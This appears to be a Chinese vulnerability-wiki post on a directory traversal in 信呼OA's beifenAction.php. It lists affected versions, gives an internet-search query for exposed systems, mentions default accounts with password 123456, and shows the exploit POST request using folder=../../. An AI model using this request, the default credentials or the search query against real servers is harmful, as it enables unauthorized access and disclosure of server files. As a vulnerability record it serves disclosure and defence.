---
title: "信呼OA beifenAction.php 后台目录遍历漏洞"
date: 2026-10-17 09:12:08
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "信呼OA"
tags:
  - "信呼OA"
  - "目录遍历"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

信呼OA beifenAction.php文件中调用了 getfilerows方法，导致了目录遍历漏洞，攻击者通过漏洞可以获取服务器上的文件信息

## 漏洞影响

```
信呼OA <= 2.3.2
```

## 网络测绘

```
app="信呼协同办公系统"
```

## 漏洞复现

登录页面

![image-20220520133147020](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201331106.png)

其中默认存在几个用户存在弱口令 123456

![image-20220520133200310](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201332409.png)

存在漏洞的文件为 `webmain/system/beifen/beifenAction.php`

![image-20220520133212813](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201332896.png)

查看 `getfilerows()` 方法，在 `include/chajian/fileChajian.php`

![image-20220520133224646](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201332744.png)

该方法遍历目录下的文件名并输出，登录后，发送请求包

```
POST /index.php?a=getdatssss&m=beifen&d=system&ajaxbool=true

folder=../../
```

![image-20220520133237936](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201332997.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-beifenAction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
